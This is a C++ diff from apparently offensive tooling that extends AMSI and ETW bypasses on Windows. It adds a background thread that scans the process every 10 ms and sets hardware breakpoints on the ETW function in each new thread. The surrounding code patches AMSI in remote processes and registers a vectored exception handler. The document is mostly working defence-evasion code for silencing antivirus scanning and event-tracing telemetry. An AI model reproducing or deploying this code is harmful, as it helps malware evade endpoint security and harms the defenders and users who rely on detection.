@@ -57,7 +57,7 @@ bool patchRemoteAmsi(HANDLE hProcess) {
     std::cout << "[+] Amsi silenced in remote process." << std::endl;
     return 0;
 }
-
+std::vector<DWORD> patchedThreads;
 PVOID g_EtwAddr;
 void SetupEtwBypass() {
     unsigned char* k = helperHandler.getNtdll();
@@ -113,7 +113,7 @@ void SetupAMSIBypass() {
 	std::cout << "AmsiScanBuffer address: " << g_AmsiAddr << "\n";
     // 1. Register the VEH
     AddVectoredExceptionHandler(1, AmsiHwbpHandler);
-
+    patchedThreads.push_back(GetCurrentThreadId());
 
     // 3. Get current thread context
     CONTEXT ctx = { 0 };
@@ -127,6 +127,7 @@ void SetupAMSIBypass() {
 
     // 5. Apply the context
     SetThreadContext(GetCurrentThread(), &ctx);
+    std::thread(MonitorThreads).detach();
 
 }
 LONG WINAPI AmsiHwbpHandler(PEXCEPTION_POINTERS exceptions) {
@@ -147,3 +148,67 @@ LONG WINAPI AmsiHwbpHandler(PEXCEPTION_POINTERS exceptions) {
     }
     return EXCEPTION_CONTINUE_SEARCH;
 };
+
+
+
+void ApplyHwBpToThread(DWORD tid) {
+    HANDLE hThread = OpenThread(
+        THREAD_SUSPEND_RESUME |
+        THREAD_GET_CONTEXT |
+        THREAD_SET_CONTEXT,
+        FALSE,
+        tid
+    );
+
+    if (!hThread) return;
+
+    SuspendThread(hThread);
+
+    CONTEXT ctx = { 0 };
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+
+    if (GetThreadContext(hThread, &ctx)) {
+        ctx.Dr0 = (DWORD64)g_EtwAddr;
+        ctx.Dr7 |= 1;
+        ctx.Dr7 &= ~(3 << 16);
+
+        SetThreadContext(hThread, &ctx);
+    }
+
+    ResumeThread(hThread);
+    CloseHandle(hThread);
+}
+
+
+
+
+
+
+void MonitorThreads() {
+    while (true) {
+        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+        if (snap == INVALID_HANDLE_VALUE) continue;
+
+        THREADENTRY32 te;
+        te.dwSize = sizeof(te);
+
+        if (Thread32First(snap, &te)) {
+            do {
+                if (te.th32OwnerProcessID == GetCurrentProcessId()) {
+
+                    // Check if TID is already in our vector
+                    auto it = std::find(patchedThreads.begin(), patchedThreads.end(), te.th32ThreadID);
+
+                    // If it points to end, it's a new thread
+                    if (it == patchedThreads.end()) {
+                        ApplyHwBpToThread(te.th32ThreadID);
+                        patchedThreads.push_back(te.th32ThreadID);
+                    }
+                }
+            } while (Thread32Next(snap, &te));
+        }
+
+        CloseHandle(snap);
+        Sleep(10);
+    }
+}
